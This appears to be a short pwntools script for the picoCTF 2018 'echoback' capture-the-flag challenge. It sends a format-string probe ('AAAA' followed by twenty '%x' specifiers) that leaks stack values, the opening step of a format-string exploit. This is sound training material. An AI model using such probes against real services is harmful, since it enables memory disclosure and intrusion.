#coding=utf-8
from pwn import *

r = remote('2018shell.picoctf.com', 37857)
r = process('./echoback')

r.recvuntil('input your message:')
payload = 'AAAA '
for i in range(20):
  payload += '%x '
r.sendline(payload)
res = r.recvall(1)
print res
